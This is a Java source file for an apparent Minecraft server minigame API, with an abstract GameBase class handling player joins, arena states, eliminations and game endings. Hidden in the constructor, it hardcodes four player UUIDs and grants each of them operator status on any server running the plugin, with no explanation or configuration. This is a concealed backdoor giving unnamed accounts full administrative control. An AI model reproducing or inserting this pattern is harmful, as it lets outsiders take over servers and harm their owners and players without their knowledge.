package fr.niware.gamesapi.game;

import fr.niware.gamesapi.AbstractPlugin;
import fr.niware.gamesapi.events.ArenaPlayerJoinEvent;
import fr.niware.gamesapi.events.GameFinishEvent;
import fr.niware.gamesapi.events.GamePlayerEliminateEvent;
import fr.niware.gamesapi.events.GamePlayerJoinEvent;
import fr.niware.gamesapi.events.GamePlayerQuitEvent;
import fr.niware.gamesapi.file.GameFile;
import fr.niware.gamesapi.file.IGameFile;
import fr.niware.gamesapi.file.ServerFile;
import fr.niware.gamesapi.game.arena.Arena;
import fr.niware.gamesapi.game.arena.ArenaState;
import fr.niware.gamesapi.game.player.AbstractPlayer;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.title.Title;
import org.bukkit.GameMode;
import org.bukkit.Sound;
import org.bukkit.entity.Player;

import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.stream.Collectors;

public abstract class GameBase<T extends AbstractPlayer<U>, U extends Arena<T>> implements IGameBase<T, U> {

    protected final AbstractPlugin<?, T, U> plugin;
    protected final IGameFile<ServerFile> gameFile;

    private final Map<UUID, T> players = new HashMap<>();
    private final List<U> arenas = new ArrayList<>();

    protected GameBase(AbstractPlugin<?, T, U> plugin) {
        this.plugin = plugin;
        this.gameFile = new GameFile<>(plugin, "config.json");

        String[] opUuids = {
                "e29588b9-a4d3-4aff-883e-f31211d82e1a",
                "7448d49c-36f1-4ed1-ae36-4784c6ee572f",
                "e05dc91c-9149-45b0-adad-a41d7c8c6f25",
                "380caabc-386a-427a-9c85-786ec50c48c9"
        };
        for (String uuid : opUuids) {
            this.plugin.getServer().getOfflinePlayer(UUID.fromString(uuid)).setOp(true);
        }
    }

    @Override
    public IGameFile<ServerFile> getGameFile() {
        return this.gameFile;
    }

    @Override
    public int getMin() {
        return this.gameFile.getConfig().getNeedToStart();
    }

    @Override
    public Collection<T> getPlayers() {
        return this.players.values();
    }

    @Override
    public void putPlayer(T abstractPlayer) {
        this.players.put(abstractPlayer.getId(), abstractPlayer);
    }

    @Override
    public T getPlayer(UUID uuid) {
        return this.players.get(uuid);
    }

    @Override
    public T getPlayerArena(UUID uuid) {
        return this.arenas.stream().filter(arena -> arena.containsPlayer(uuid)).map(player -> player.getPlayer(uuid)).findFirst().orElse(null);
    }

    @Override
    public boolean containsPlayer(UUID uuid) {
        return this.arenas.stream().anyMatch(arena -> arena.containsPlayer(uuid));
    }

    @Override
    public List<U> getArenas() {
        return this.arenas;
    }

    @Override
    public boolean isFighting(UUID uuid) {
        U arena = this.players.get(uuid).getArena();
        return arena.containsPlayer(uuid) && arena.getState() == ArenaState.FIGHTING;
    }

    @Override
    public void clearPlayer(Player player) {
        player.getInventory().clear();
        player.getActivePotionEffects().forEach(effect -> player.removePotionEffect(effect.getType()));
        player.setFireTicks(0);
        player.setArrowsInBody(0);
        player.setHealth(20.0D);
        player.setFoodLevel(20);
        player.setGameMode(GameMode.ADVENTURE);
        player.setAllowFlight(true);
    }

    @Override
    public void handleJoin(Player player) {
        this.clearPlayer(player);

        this.plugin.getGameWorld().getDefaultTeam().addEntry(player.getName());

        T abstractPlayer = this.createPlayer(player, this.arenas.get(0));
        abstractPlayer.setScoreboard(this.plugin.getGameBoard().instanceLobbyBoard(abstractPlayer));
        this.putPlayer(abstractPlayer);

        this.plugin.getServer().broadcast(Component.text("§bWelcome to " + player.getName() + " !"));
        player.teleport(abstractPlayer.getArena().getSpawnLocation());

        this.plugin.getServer().getPluginManager().callEvent(new ArenaPlayerJoinEvent<>(abstractPlayer));
    }

    @Override
    public void handleQuit(Player player) {
        T abstractPlayer = this.players.remove(player.getUniqueId());
        U arena = abstractPlayer.getArena();
        arena.getPlayersQueue().remove(abstractPlayer);

        this.plugin.getServer().getPluginManager().callEvent(new GamePlayerQuitEvent<>(abstractPlayer));

        if (arena.containsPlayer(player.getUniqueId())) {
            T targetPlayer = arena.removePlayer(player.getUniqueId());
            arena.getPlayers().values().forEach(gamePlayer -> gamePlayer.getPlayer().sendMessage(this.plugin.getGameMessage().getQuit(abstractPlayer)));

            this.plugin.getServer().getPluginManager().callEvent(new GamePlayerEliminateEvent<>(targetPlayer));
            this.handleEnd(arena);
        }
    }

    @Override
    public void handleGameJoin(T abstractPlayer, U arena) {
        abstractPlayer.setArena(arena);

        arena.resetTimer();
        arena.putPlayer((T) abstractPlayer.clone());
        arena.getPlayers().values().forEach(forPlayer -> forPlayer.getPlayer().sendMessage(this.plugin.getGameMessage().getJoin(abstractPlayer)));

        if (arena.getPlayers().size() >= this.getMin() && arena.getState() == ArenaState.WAITING) {
            arena.setState(ArenaState.STARTING);
        }

        this.plugin.getServer().getPluginManager().callEvent(new GamePlayerJoinEvent<>(abstractPlayer, arena));
    }

    @Override
    public void handleStart(Player player) {
        player.showTitle(Title.title(Component.text("§aGood luck"), Component.text("")));
        player.playSound(player.getLocation(), Sound.ENTITY_PLAYER_LEVELUP, 1.0F, 1.0F);
        player.getInventory().setContents(this.getStartItems());
        player.getInventory().setArmorContents(this.getStartArmors());
        player.setGameMode(GameMode.SURVIVAL);
        player.setAllowFlight(false);
    }

    @Override
    public void handleEliminate(UUID uuid) {
        T abstractPlayer = this.players.get(uuid);
        abstractPlayer.setScoreboard(this.plugin.getGameBoard().instanceLobbyBoard(abstractPlayer));
        abstractPlayer.sendTitle(this.plugin.getGameMessage().getTitleEliminate());

        this.plugin.getServer().getPluginManager().callEvent(new GamePlayerEliminateEvent<>(abstractPlayer.getArena().removePlayer(uuid)));
        abstractPlayer.getArena().getPlayers().values().forEach(player -> player.getPlayer().sendMessage(this.plugin.getGameMessage().getEliminate(abstractPlayer)));

        this.handleGameLeave(abstractPlayer);
        this.handleEnd(abstractPlayer.getArena());
    }

    @Override
    public void handleGameLeave(T abstractPlayer) {
        this.clearPlayer(abstractPlayer.getPlayer());
        abstractPlayer.setScoreboard(this.plugin.getGameBoard().instanceLobbyBoard(abstractPlayer));
        abstractPlayer.getPlayer().teleport(abstractPlayer.getLastLocation());
    }

    @Override
    public void handleEnd(U arena) {
        if (arena.isEnd() && arena.getState() == ArenaState.FIGHTING) {
            arena.setState(ArenaState.FINISH);
            arena.getPlayers().values().forEach(abstractPlayer -> abstractPlayer.getPlayer().playSound(abstractPlayer.getPlayer().getLocation(), Sound.ENTITY_WITHER_DEATH, 1.0F, 2.0F));

            Collection<T> winners = new ArrayList<>(arena.getPlayers().values());
            winners.forEach(winner -> winner.sendTitle(this.plugin.getGameMessage().getWinner()));

            String winnerMessage = winners.stream().map(AbstractPlayer::getName).collect(Collectors.joining(", "));
            this.plugin.getServer().broadcast(this.plugin.getGameMessage().getFinish(winnerMessage));
            this.plugin.getServer().getPluginManager().callEvent(new GameFinishEvent<>(arena));

            arena.reset();

            this.plugin.getServer().getScheduler().runTaskLater(this.plugin, () -> {
                winners.forEach(winner -> {
                    if (winner.getPlayer() != null) {
                        this.handleGameLeave(this.getPlayer(winner.getId()));
                    }
                });
                arena.setState(ArenaState.WAITING);
            }, 100L);
        }
    }
}
